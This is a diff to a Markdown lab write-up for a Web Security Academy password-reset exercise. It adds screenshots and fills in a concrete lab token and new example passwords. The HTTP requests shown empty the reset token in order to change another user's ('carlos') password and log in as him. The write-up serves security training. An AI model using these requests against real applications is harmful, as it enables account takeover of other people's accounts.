@@ -130,10 +130,12 @@ This allows the attacker to change another user's password without possessing th
 ## Step 1 — Configuring FoxyProxy
 
 Before starting the lab, I turned on **FoxyProxy** in Firefox and selected the Burp Suite proxy.
-
 This sends the Firefox traffic through Burp Suite so I can see the requests.
-
 I checked **Burp Suite → Proxy → HTTP history** to make sure the requests were showing up.
+
+<p align="center">
+  <img src="images/step1-1.png" width="600">
+</p>
 
 ## Step 2 — Requesting a Password Reset
 
@@ -148,10 +150,12 @@ wiener
 ```
 
 I then submitted the form to trigger a password reset email.
-
 Next, I opened the **Email client** provided by the lab environment and clicked the password reset link.
-
 I completed the password reset for my own account.
+
+<p align="center">
+  <img src="images/step2-1.png" width="600">
+</p>
 
 ---
 
@@ -164,15 +168,18 @@ With Burp Suite running, I opened:
 I located the password reset request:
 
 ```http
-POST /forgot-password?temp-forgot-password-token=[token_value]
+POST /forgot-password?temp-forgot-password-token=rssmfrjvgbn3wlx33mnfm7yzemrc128l 
 ```
+<p align="center">
+  <img src="images/step3-1.png" width="600">
+</p>
 
 The request contained two important instances of the reset token.
 
 ### URL Parameter
 
 ```text
-temp-forgot-password-token=[token_value]
+temp-forgot-password-token=rssmfrjvgbn3wlx33mnfm7yzemrc128l
 ```
 
 ### Request Body
@@ -182,8 +189,11 @@ The request body also contained the same token together with the username and ne
 For example:
 
 ```text
-temp-forgot-password-token=[token_value]&username=wiener&new-password-1=12345&new-password-2=12345
+temp-forgot-password-token=rssmfrjvgbn3wlx33mnfm7yzemrc128l&username=wiener&new-password-1=54321&new-password-2=54321
 ```
+<p align="center">
+  <img src="images/step3-2.png" width="600">
+</p>
 
 I right-clicked the request and selected:
 
@@ -206,7 +216,7 @@ POST /forgot-password?temp-forgot-password-token= HTTP/2
 ### Modified Request Body
 
 ```text
-temp-forgot-password-token=&username=wiener&new-password-1=12345&new-password-2=12345
+temp-forgot-password-token=rssmfrjvgbn3wlx33mnfm7yzemrc128l&username=wiener&new-password-1=54321&new-password-2=54321
 ```
 
 The complete request looked like:
@@ -216,7 +226,7 @@ POST /forgot-password?temp-forgot-password-token= HTTP/2
 Host: [lab-id].web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
-temp-forgot-password-token=&username=wiener&new-password-1=12345&new-password-2=12345
+temp-forgot-password-token=&username=wiener&new-password-1=54321&new-password-2=54321
 ```
 
 After clicking **Send**, the application accepted the request and returned:
@@ -228,6 +238,10 @@ After clicking **Send**, the application accepted the request and returned:
 No token-validation error was returned.
 
 This confirmed that the backend was not properly enforcing the reset token.
+
+<p align="center">
+  <img src="images/step4-1.png" width="600">
+</p>
 
 ---
 
@@ -254,12 +268,16 @@ POST /forgot-password?temp-forgot-password-token= HTTP/2
 Host: [lab-id].web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
-temp-forgot-password-token=&username=carlos&new-password-1=12345&new-password-2=12345
+temp-forgot-password-token=&username=carlos&new-password-1=54321&new-password-2=54321
 ```
 
 I sent the request through Burp Repeater.
 
 The application accepted the request and changed the password for `carlos`.
+
+<p align="center">
+  <img src="images/step5-1.png" width="600">
+</p>
 
 ---
 
@@ -269,7 +287,7 @@ I returned to the login page and entered:
 
 ```text
 Username: carlos
-Password: 12345
+Password: 54321
 ```
 
 The login was successful.
@@ -279,6 +297,10 @@ After logging in, I opened:
 **My account**
 
 The lab was successfully solved.
+
+<p align="center">
+  <img src="images/step6-1.png" width="600">
+</p>
 
 ---
 
